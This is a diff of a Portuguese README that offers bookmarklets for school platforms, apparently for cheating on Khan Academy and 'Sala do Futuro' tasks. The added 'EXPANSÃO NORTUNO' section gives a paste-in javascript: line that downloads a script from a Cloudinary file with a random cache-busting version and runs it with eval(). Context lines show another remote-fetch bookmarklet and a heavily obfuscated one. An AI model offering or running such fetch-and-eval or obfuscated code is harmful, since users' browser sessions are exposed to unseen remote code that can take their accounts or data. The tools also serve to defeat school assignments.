@@ -20,6 +20,14 @@ javascript:fetch("https://raw.githubusercontent.com/Snowxyrzk/Khan-Destroyer/ref
 javascript:function remove_block(){const e=function(e){return e.stopImmediatePropagation(),!0};document.addEventListener("copy",e,!0),document.addEventListener("cut",e,!0),document.addEventListener("paste",e,!0),alert("Block Removed!")}remove_block();
 ```
 
+## EXPANSÃO NORTUNO
+
+<img src="https://i.ibb.co/Zz8mkfF2/Captura-de-tela-2025-03-24-143631.png" alt="Captura-de-tela-2025-03-24-143631" width="270" height="250"></a>
+
+```
+javascript:fetch(`https://res.cloudinary.com/dcwnwmtgc/raw/upload/v${Math.floor(Math.random() * 1000000)}/zxay141rf6uw3wwzea35.txt`).then(r => r.text()).then(r => eval(r));
+```
+
 
 <img src="https://i.ibb.co/wWgm3Z7/leiasp-1.png" width="350" height="200">
 
@@ -34,9 +42,9 @@ javascript:(function()%7Bfunction _0x2ca6(_0x296377%2C_0xa107bc)%7Bconst _0x73d9
 
 ### SALA DO FUTURO
 
-```
-https://doritus.mmrcoss.tech/
-```
+
+[Tarefas](https://doritus.mmrcoss.tech/)
+
 
 <img src="https://i.imgur.com/gP1LZq9.png" width="250" height="250">
  
